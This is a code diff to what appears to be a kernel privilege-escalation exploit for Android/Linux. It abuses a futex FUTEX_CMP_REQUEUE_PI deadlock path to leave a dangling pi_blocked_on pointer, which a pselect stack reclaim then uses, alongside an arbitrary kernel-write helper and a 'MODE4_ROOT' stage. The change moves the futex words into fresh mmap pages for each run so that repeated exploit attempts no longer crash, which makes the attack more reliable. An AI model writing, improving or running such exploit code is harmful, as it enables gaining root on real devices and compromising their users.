@@ -134,9 +134,16 @@ extern int pselect_child_node;
 void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
 void clear_pselect_write(void);
 
-uint32_t f_wait;
-uint32_t f_pi_target;
-uint32_t f_pi_chain;
+/*
+ * Futex words live in a FRESH anonymous mapping per route run. Fixed BSS
+ * words made the second in-process run (MODE4_ROOT phase 2) reuse the
+ * same hash buckets — still poisoned with phase-1 dangling waiters — and
+ * the requeue walk crashed every time (R4/R6/R8). Old mappings stay
+ * mapped so later mmaps get new VAs (different hb buckets).
+ */
+uint32_t *f_wait;
+uint32_t *f_pi_target;
+uint32_t *f_pi_chain;
 atomic_int waiter_ready;
 atomic_int waiter_waiting;
 atomic_int owner_started;
@@ -172,7 +179,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
    *   CMP_REQUEUE_PI closes cycle → -EDEADLK → buggy remove_waiter leaves
    *   waiter->task->pi_blocked_on dangling at stack waiter for pselect reclaim.
    */
-  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+  if (futex_op(f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
     pr_error("waiter lock chain errno=%d\n", errno);
   atomic_store(&waiter_ready, 1);
   while (!atomic_load(&owner_started)) usleep(1000);
@@ -191,8 +198,8 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
   errno = 0;
-  long wret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-                       &f_pi_target, 0);
+  long wret = futex_op(f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                       f_pi_target, 0);
   int werr = errno;
   if (selfstamp) {
     /*
@@ -227,14 +234,14 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   do_pselect_fake_lock_route();
   durable_stage("waiter_pselect_returned");
   atomic_store(&route_done, 1);
-  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  futex_op(f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
   return NULL;
 }
 
 void *owner_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
-  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  long lock_target = futex_op(f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
   while (!atomic_load(&waiter_ready)) usleep(1000);
   /*
@@ -249,7 +256,7 @@ void *owner_thread(void *arg __attribute__((unused))) {
     while (!atomic_load(&owner_unlock_req) && !atomic_load(&route_done))
       usleep(200);
     if (atomic_load(&owner_unlock_req)) {
-      long ur = futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+      long ur = futex_op(f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
       atomic_store(&owner_unlock_done, 1);
       pr_info("owner UNLOCK f_pi_target ret=%ld errno=%d\n", ur, errno);
     }
@@ -257,7 +264,7 @@ void *owner_thread(void *arg __attribute__((unused))) {
     atomic_store(&owner_started, 1);
     pr_info("owner blocking on f_pi_chain (deadlock stage for EDEADLK)\n");
   }
-  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  futex_op(f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   atomic_store(&owner_chain_done, 1);
   for (;;) sleep(1);
 }
@@ -349,9 +356,9 @@ void *consumer_thread(void *arg __attribute__((unused))) {
          */
         if (sched_ret != 0 && env_flag("MODE4_FUTEX_PUNCH", 0)) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
-          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
+          long fret = futex_op(f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
           if (fret == 0) {
-            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            futex_op(f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
             sched_ret = 0;
           }
         }
@@ -393,7 +400,18 @@ void *consumer_thread(void *arg __attribute__((unused))) {
 }
 
 void reset_main_route_state(void) {
-  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
+  /* Fresh futex words per run: new VA => new hb bucket => no stale
+   * waiters from a previous in-process route run. Mapping intentionally
+   * leaked (never munmap'd) so the next mmap can't reuse this VA. */
+  void *fw = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                  MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+  if (fw == MAP_FAILED) {
+    pr_error("route futex-word mmap failed errno=%d\n", errno);
+    exit(1);
+  }
+  f_wait = (uint32_t *)fw;
+  f_pi_target = (uint32_t *)fw + 1;
+  f_pi_chain = (uint32_t *)fw + 2;
   atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
   atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
   atomic_store(&owner_unlock_req, 0); atomic_store(&owner_unlock_done, 0);
@@ -420,8 +438,8 @@ void run_main_route_threads(void) {
   usleep(80000);
   durable_stage("before_cmp_requeue_pi");
   errno = 0;
-  long rret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-                       &f_pi_target, 0);
+  long rret = futex_op(f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                       f_pi_target, 0);
   int rerr = errno;
   {
     int mf = open("/data/local/tmp/flow", O_WRONLY | O_CREAT | O_APPEND, 0644);
